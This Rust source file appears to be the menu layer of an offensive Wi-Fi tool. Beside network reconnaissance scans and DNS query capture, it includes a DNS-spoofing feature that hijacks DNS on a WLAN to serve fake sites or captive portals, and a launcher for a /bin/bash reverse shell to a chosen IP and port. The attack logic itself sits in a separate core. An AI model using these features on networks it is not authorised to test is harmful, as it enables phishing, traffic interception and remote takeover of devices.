use anyhow::Result;
use rustyjack_commands::{
    Commands, DnsSpoofCommand, DnsSpoofStartArgs, ReverseCommand, ReverseLaunchArgs, WifiCommand,
};

use crate::util::shorten_for_display;

use super::state::App;

impl App {
    pub(crate) fn toggle_dns_spoof(&mut self) -> Result<()> {
        // Check current status
        let is_running = self.status_overlay().dns_spoof_running;

        if is_running {
            self.stop_dns_spoof()
        } else {
            self.start_dns_spoof()
        }
    }

    pub(crate) fn recon_gateway(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconCommand, WifiReconGatewayArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Gateway Info", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Gateway Info")? else {
                return Ok(());
            };

            self.show_message(
                "Gateway Info",
                [
                    "Discover network gateway,",
                    "DNS servers, and DHCP",
                    "server information.",
                    "",
                    &format!("Interface: {}", iface),
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Discovery?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Gateway Discovery",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Querying network info...",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconGatewayArgs {
                interface: Some(iface.clone()),
            };

            match self.dispatch_cancellable(
                "Gateway Discovery",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::Gateway(args))),
                10,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["Gateway Discovery".to_string(), "".to_string()];
                    lines.push(format!("Interface: {}", iface));
                    lines.push("".to_string());

                    if let Some(gw) = data.get("default_gateway").and_then(|v| v.as_str()) {
                        lines.push(format!("Gateway: {}", gw));
                    } else {
                        lines.push("Gateway: Not found".to_string());
                    }

                    if let Some(dns) = data.get("dns_servers").and_then(|v| v.as_array()) {
                        if !dns.is_empty() {
                            lines.push("DNS Servers:".to_string());
                            for server in dns.iter().take(3) {
                                if let Some(s) = server.as_str() {
                                    lines.push(format!("  {}", s));
                                }
                            }
                        }
                    }

                    if let Some(dhcp) = data.get("dhcp_server").and_then(|v| v.as_str()) {
                        lines.push(format!("DHCP: {}", dhcp));
                    }

                    self.scrollable_text_viewer("Gateway Info", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn recon_arp_scan(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconArpScanArgs, WifiReconCommand};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("ARP Scan", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("ARP Scan")? else {
                return Ok(());
            };

            if !self.interface_has_ip(&iface) {
                return self.show_message(
                    "ARP Scan",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before scanning.",
                    ],
                );
            }

            self.show_message(
                "ARP Scan",
                [
                    "Discover all devices on",
                    "the local subnet using",
                    "ARP requests.",
                    "",
                    &format!("Interface: {}", iface),
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start ARP Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "ARP Scan",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Scanning local network...",
                    "This may take 30 seconds",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconArpScanArgs {
                interface: iface.clone(),
            };

            match self.dispatch_cancellable(
                "ARP Scan",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::ArpScan(args))),
                40,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["Local Network Devices".to_string(), "".to_string()];

                    if let Some(devices) = data.get("devices").and_then(|d| d.as_array()) {
                        if devices.is_empty() {
                            lines.push("No devices found".to_string());
                        } else {
                            for device in devices {
                                if let Some(ip) = device.get("ip").and_then(|v| v.as_str()) {
                                    lines.push(format!("{}", ip));
                                    if let Some(mac) = device.get("mac").and_then(|v| v.as_str()) {
                                        lines.push(format!("  MAC: {}", mac));
                                    }
                                    if let Some(hostname) =
                                        device.get("hostname").and_then(|v| v.as_str())
                                    {
                                        lines.push(format!("  Host: {}", hostname));
                                    }
                                    if let Some(vendor) =
                                        device.get("vendor").and_then(|v| v.as_str())
                                    {
                                        let short_vendor = shorten_for_display(vendor, 18);
                                        lines.push(format!("  {}", short_vendor));
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Total: {} device(s)",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("ARP Scan Results", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn recon_service_scan(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconCommand, WifiReconServiceScanArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Service Scan", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Service Scan")? else {
                return Ok(());
            };

            if !self.interface_has_ip(&iface) {
                return self.show_message(
                    "Service Scan",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before scanning.",
                    ],
                );
            }

            self.show_message(
                "Service Scan",
                [
                    "Scan common network",
                    "services (HTTP, SSH, SMB)",
                    "on discovered devices.",
                    "",
                    "This may take 60+ seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Service Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Service Scan",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Discovering devices...",
                    "Then scanning services...",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconServiceScanArgs {
                interface: iface.clone(),
            };

            match self.dispatch_cancellable(
                "Service Scan",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::ServiceScan(args))),
                120,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["Network Services".to_string(), "".to_string()];

                    if let Some(results) = data.get("results").and_then(|r| r.as_array()) {
                        if results.is_empty() {
                            lines.push("No services found".to_string());
                        } else {
                            for host in results {
                                if let Some(ip) = host.get("ip").and_then(|v| v.as_str()) {
                                    lines.push(format!("{}", ip));
                                    if let Some(services) =
                                        host.get("services").and_then(|s| s.as_array())
                                    {
                                        for svc in services {
                                            if let (Some(port), Some(name)) = (
                                                svc.get("port").and_then(|p| p.as_u64()),
                                                svc.get("service").and_then(|s| s.as_str()),
                                            ) {
                                                lines.push(format!("  {}: {}", port, name));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Hosts: {}",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("Service Scan", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn recon_mdns_scan(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconCommand, WifiReconMdnsScanArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("mDNS Discovery", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(_iface) = self.require_connected_wireless("mDNS Discovery")? else {
                return Ok(());
            };

            self.show_message(
                "mDNS Discovery",
                [
                    "Discover mDNS/Bonjour",
                    "devices (printers, smart",
                    "devices, Apple devices).",
                    "",
                    "Duration: 10 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start mDNS Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "mDNS Discovery",
                [
                    "Listening for mDNS",
                    "announcements...",
                    "",
                    "Duration: 10 seconds",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconMdnsScanArgs { duration: 10 };

            match self.dispatch_cancellable(
                "mDNS Discovery",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::MdnsScan(args))),
                15,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["mDNS/Bonjour Devices".to_string(), "".to_string()];

                    if let Some(devices) = data.get("devices").and_then(|d| d.as_array()) {
                        if devices.is_empty() {
                            lines.push("No mDNS devices found".to_string());
                            lines.push("".to_string());
                            lines.push("Note: Requires avahi".to_string());
                            lines.push("Install: apt install".to_string());
                            lines.push("avahi-utils".to_string());
                        } else {
                            for device in devices {
                                if let (Some(name), Some(ip)) = (
                                    device.get("name").and_then(|v| v.as_str()),
                                    device.get("ip").and_then(|v| v.as_str()),
                                ) {
                                    let short_name = shorten_for_display(name, 20);
                                    lines.push(format!("{}", short_name));
                                    lines.push(format!("  IP: {}", ip));
                                    if let Some(services) =
                                        device.get("services").and_then(|s| s.as_array())
                                    {
                                        for svc in services.iter().take(2) {
                                            if let Some(svc_str) = svc.as_str() {
                                                let short_svc = shorten_for_display(svc_str, 18);
                                                lines.push(format!("  {}", short_svc));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Total: {} device(s)",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("mDNS Discovery", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn recon_bandwidth(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconBandwidthArgs, WifiReconCommand};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Bandwidth Monitor", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Bandwidth Monitor")? else {
                return Ok(());
            };

            if !self.interface_has_ip(&iface) {
                return self.show_message(
                    "Bandwidth Monitor",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before monitoring.",
                    ],
                );
            }

            self.show_message(
                "Bandwidth Monitor",
                [
                    "Monitor real-time upload",
                    "and download bandwidth",
                    "usage on the interface.",
                    "",
                    &format!("Interface: {}", iface),
                    "Duration: 10 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Monitoring?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Bandwidth Monitor",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Monitoring traffic...",
                    "Duration: 10 seconds",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconBandwidthArgs {
                interface: iface.clone(),
                duration: 10,
            };

            match self.dispatch_cancellable(
                "Bandwidth Monitor",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::Bandwidth(args))),
                15,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["Bandwidth Monitor".to_string(), "".to_string()];
                    lines.push(format!("Interface: {}", iface));
                    lines.push("".to_string());

                    if let Some(rx_mbps) = data.get("rx_mbps").and_then(|v| v.as_f64()) {
                        lines.push(format!("Download: {:.2} Mbps", rx_mbps));
                    }
                    if let Some(tx_mbps) = data.get("tx_mbps").and_then(|v| v.as_f64()) {
                        lines.push(format!("Upload: {:.2} Mbps", tx_mbps));
                    }
                    lines.push("".to_string());
                    if let Some(rx_bytes) = data.get("rx_bytes").and_then(|v| v.as_u64()) {
                        lines.push(format!("RX: {} bytes", rx_bytes));
                    }
                    if let Some(tx_bytes) = data.get("tx_bytes").and_then(|v| v.as_u64()) {
                        lines.push(format!("TX: {} bytes", tx_bytes));
                    }
                    lines.push("".to_string());
                    lines.push(format!(
                        "Duration: {}s",
                        data.get("duration_secs")
                            .and_then(|d| d.as_u64())
                            .unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("Bandwidth Results", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn recon_dns_capture(&mut self) -> Result<()> {
        use rustyjack_commands::{WifiReconCommand, WifiReconDnsCaptureArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("DNS Capture", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("DNS Capture")? else {
                return Ok(());
            };

            if !self.interface_has_ip(&iface) {
                return self.show_message(
                    "DNS Capture",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before capturing.",
                    ],
                );
            }

            self.show_message(
                "DNS Capture",
                [
                    "Passively capture DNS",
                    "queries on the network",
                    "using packet capture.",
                    "",
                    &format!("Interface: {}", iface),
                    "Duration: 30 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start DNS Capture?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "DNS Capture",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Capturing DNS queries...",
                    "Duration: 30 seconds",
                    "",
                    "Press KEY2 to cancel",
                ],
            )?;

            let args = WifiReconDnsCaptureArgs {
                interface: iface.clone(),
                duration: 30,
            };

            match self.dispatch_cancellable(
                "DNS Capture",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::DnsCapture(args))),
                40,
            )? {
                Some((_msg, data)) => {
                    let mut lines = vec!["DNS Query Capture".to_string(), "".to_string()];

                    if let Some(queries) = data.get("queries").and_then(|q| q.as_array()) {
                        if queries.is_empty() {
                            lines.push("No DNS queries captured".to_string());
                            lines.push("".to_string());
                            lines.push("Note: Requires capture support".to_string());
                        } else {
                            lines.push("Captured Domains:".to_string());
                            lines.push("".to_string());
                            for query in queries.iter().take(50) {
                                if let Some(domain) = query.get("domain").and_then(|d| d.as_str()) {
                                    let short_domain = shorten_for_display(domain, 20);
                                    if let Some(qtype) = query.get("type").and_then(|t| t.as_str())
                                    {
                                        lines.push(format!("{} ({})", short_domain, qtype));
                                    } else {
                                        lines.push(short_domain);
                                    }
                                }
                            }
                        }
                    }

                    lines.push("".to_string());
                    let total = data.get("count").and_then(|c| c.as_u64()).unwrap_or(0);
                    lines.push(format!("Total: {} queries", total));
                    if total > 50 {
                        lines.push("(showing first 50)".to_string());
                    }

                    self.scrollable_text_viewer("DNS Capture", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    pub(crate) fn start_dns_spoof(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("DNS Spoof")? else {
            return Ok(());
        };

        let sites = self.list_dnsspoof_sites();
        if sites.is_empty() {
            return self.show_message(
                "DNS Spoof",
                [
                    "No site templates found.",
                    "Add folders under",
                    "DNSSpoof/sites/<name>",
                ],
            );
        }
        let choice = self.choose_dnsspoof_site(&sites)?;
        let Some(site) = choice else {
            return Ok(());
        };

        self.show_message(
            "DNS Spoof",
            [
                "Hijacks DNS on this WLAN",
                "and serves the selected",
                "site/captive portal.",
                "",
                "Press Start to launch.",
                "Stop via Stop DNS Spoof.",
            ],
        )?;
        let confirm = self.choose_from_list(
            "Start DNS Spoof?",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        let args = DnsSpoofStartArgs {
            site: site.clone(),
            interface: Some(iface.clone()),
            loot_dir: None,
        };

        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Start(args)))
        {
            Ok((msg, _)) => self.show_message(
                "DNS Spoof",
                [
                    msg,
                    format!("Site: {}", site),
                    format!("Interface: {}", iface),
                ],
            ),
            Err(e) => self.show_message("DNS Spoof", [format!("Start failed: {}", e)]),
        }
    }

    pub(crate) fn stop_dns_spoof(&mut self) -> Result<()> {
        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop))
        {
            Ok((msg, _)) => self.show_message("DNS Spoof", [msg]),
            Err(e) => self.show_message("DNS Spoof", [format!("Stop failed: {}", e)]),
        }
    }

    pub(crate) fn launch_reverse_shell(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("Reverse Shell")? else {
            return Ok(());
        };

        self.show_message(
            "Reverse Shell",
            [
                "Connects back to a host",
                "with /bin/bash via TCP.",
                "",
                "Ensure listener is ready.",
                "Press Start to continue.",
            ],
        )?;
        let cont = self.choose_from_list(
            "Launch shell?",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if cont != Some(0) {
            return Ok(());
        }

        // Prompt for target IP octets
        let mut octets = Vec::new();
        for i in 0..4 {
            let prefix = match i {
                0 => "Target",
                1 => "Target",
                2 => "Target",
                _ => "Target",
            };
            let part = self.prompt_octet(prefix)?;
            let Some(val) = part else {
                return Ok(());
            };
            octets.push(val);
        }
        let target_ip = format!("{}.{}.{}.{}", octets[0], octets[1], octets[2], octets[3]);

        // Prompt for port (common choices)
        let ports = vec!["4444", "9001", "1337", "5555"];
        let port_choice = self.choose_from_list(
            "LPORT",
            &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>(),
        )?;
        let port: u16 = port_choice
            .and_then(|idx| ports.get(idx))
            .and_then(|p| p.parse().ok())
            .unwrap_or(4444);

        let args = ReverseLaunchArgs {
            target: target_ip.clone(),
            port,
            shell: "/bin/bash".to_string(),
            interface: Some(iface.clone()),
        };

        match self
            .core
            .dispatch(Commands::Reverse(ReverseCommand::Launch(args)))
        {
            Ok((msg, _)) => self.show_message(
                "Reverse Shell",
                [
                    msg,
                    format!("Target: {}", target_ip),
                    format!("Port: {}", port),
                    format!("Iface: {}", iface),
                ],
            ),
            Err(e) => {
                let err_text = e.to_string();
                if err_text.contains("reverse shell disabled")
                    || err_text.contains("external shell spawn removed")
                {
                    return self.show_message(
                        "Reverse Shell",
                        ["Feature disabled", "Rust-only build"],
                    );
                }
                self.show_message("Reverse Shell", [format!("Launch failed: {}", err_text)])
            }
        }
    }
}
